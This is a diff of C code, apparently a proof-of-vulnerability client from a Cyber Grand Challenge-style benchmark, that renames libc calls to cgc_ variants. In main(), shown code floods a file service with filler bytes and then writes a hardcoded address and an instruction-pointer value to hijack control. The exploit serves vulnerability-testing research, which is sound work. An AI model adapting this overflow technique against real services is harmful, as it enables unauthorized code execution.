@@ -28,14 +28,14 @@ void buffer_append(uint8_t* data, uint32_t data_len)
   if (buffer_len + data_len > buffer_cap)
   {
     uint8_t* new = malloc(buffer_cap * 2);
-    memcpy(new, buffer, buffer_len);
+    cgc_memcpy(new, buffer, buffer_len);
     free(buffer);
 
     buffer_cap *= 2;
     buffer = new;
   }
 
-  memcpy(buffer + buffer_len, data, data_len);
+  cgc_memcpy(buffer + buffer_len, data, data_len);
   buffer_len += data_len;
 }
 
@@ -61,14 +61,14 @@ int uc(int c, const char* path)
   size_t s = 0;
   int mode = 0;
 
-  size_t slen = strlen(path) + 1;
+  size_t slen = cgc_strlen(path) + 1;
   s += sizeof(slen) + slen;
   s += sizeof(mode);
 
   uint8_t* out = malloc(s);
-  memcpy(out, &slen, sizeof(slen));
-  memcpy(out + sizeof(slen), path, slen);
-  memcpy(out + sizeof(slen) + slen, &mode, sizeof(mode));
+  cgc_memcpy(out, &slen, sizeof(slen));
+  cgc_memcpy(out + sizeof(slen), path, slen);
+  cgc_memcpy(out + sizeof(slen) + slen, &mode, sizeof(mode));
 
   if (c)
     return send_req(CREAT_F_NUM, out, s);
@@ -90,7 +90,7 @@ int open(const char* path, int flags, int mode)
 {
   size_t s = 0;
 
-  size_t slen = strlen(path) + 1;
+  size_t slen = cgc_strlen(path) + 1;
   s += sizeof(slen);
   s += slen;
   s += sizeof(flags);
@@ -98,10 +98,10 @@ int open(const char* path, int flags, int mode)
 
   uint8_t* out = malloc(s);
 
-  memcpy(out, &slen, sizeof(slen));
-  memcpy(out + sizeof(slen), path, slen);
-  memcpy(out + sizeof(slen) + slen, &flags, sizeof(flags));
-  memcpy(out + sizeof(slen) + slen + sizeof(flags), &mode, sizeof(mode));
+  cgc_memcpy(out, &slen, sizeof(slen));
+  cgc_memcpy(out + sizeof(slen), path, slen);
+  cgc_memcpy(out + sizeof(slen) + slen, &flags, sizeof(flags));
+  cgc_memcpy(out + sizeof(slen) + slen + sizeof(flags), &mode, sizeof(mode));
 
   return send_req(OPEN_F_NUM, out, s);
 }
@@ -119,12 +119,12 @@ int rw(int r, int fd, size_t count, uint8_t* data)
     s += count;
   }
 
-  memcpy(out, dumb(&fd), sizeof(fd));
-  memcpy(out + sizeof(fd), dumb(&count), sizeof(count));
+  cgc_memcpy(out, dumb(&fd), sizeof(fd));
+  cgc_memcpy(out + sizeof(fd), dumb(&count), sizeof(count));
 
   if (data)
   {
-    memcpy(out + sizeof(fd) + sizeof(count), data, count);
+    cgc_memcpy(out + sizeof(fd) + sizeof(count), data, count);
   }
 
   if (r)
@@ -133,12 +133,12 @@ int rw(int r, int fd, size_t count, uint8_t* data)
     return send_req(WRITE_F_NUM, out, s);
 }
 
-int read(int fd, size_t count)
+int cgc_read(int fd, size_t count)
 {
   return rw(1, fd, count, NULL);
 }
 
-int write(int fd, size_t count, uint8_t* data)
+int cgc_write(int fd, size_t count, uint8_t* data)
 {
   return rw(0, fd, count, dumb(data));
 }
@@ -150,7 +150,7 @@ int close(int fd)
   s += sizeof(fd);
   uint8_t* out = malloc(s);
 
-  memcpy(out, dumb(&fd), sizeof(fd));
+  cgc_memcpy(out, dumb(&fd), sizeof(fd));
 
   return send_req(CLOSE_F_NUM, out, s);
 }
@@ -164,9 +164,9 @@ int lseek(int fd, ssize_t offset, int whence)
   s += sizeof(whence);
 
   uint8_t* out = malloc(s);
-  memcpy(out, dumb(&fd), sizeof(fd));
-  memcpy(out + sizeof(fd), dumb(&offset), sizeof(offset));
-  memcpy(out + sizeof(fd) + sizeof(offset), dumb(&whence), sizeof(whence));
+  cgc_memcpy(out, dumb(&fd), sizeof(fd));
+  cgc_memcpy(out + sizeof(fd), dumb(&offset), sizeof(offset));
+  cgc_memcpy(out + sizeof(fd) + sizeof(offset), dumb(&whence), sizeof(whence));
 
   return send_req(LSEEK_F_NUM, out, s);
 }
@@ -190,13 +190,13 @@ int main(void)
     void* payload_addr_addr = "\x1c\x37\xe4\xb7";
 
     uint8_t all_filler_no_killer[4];
-    memset(all_filler_no_killer, 0xce, sizeof(all_filler_no_killer));
+    cgc_memset(all_filler_no_killer, 0xce, sizeof(all_filler_no_killer));
     for (size_t i = 0; i < 32768; ++i)
     {
-      write(1, sizeof(all_filler_no_killer), all_filler_no_killer);
+      cgc_write(1, sizeof(all_filler_no_killer), all_filler_no_killer);
     }
-    write(1, sizeof(uint32_t), dumb(payload_addr_addr));
-    write(1, sizeof(uint32_t), dumb(&t1.ipval));
+    cgc_write(1, sizeof(uint32_t), dumb(payload_addr_addr));
+    cgc_write(1, sizeof(uint32_t), dumb(&t1.ipval));
 
     lseek(1, t1.regval, 0);
     unsigned done = 0xb7eb7e;
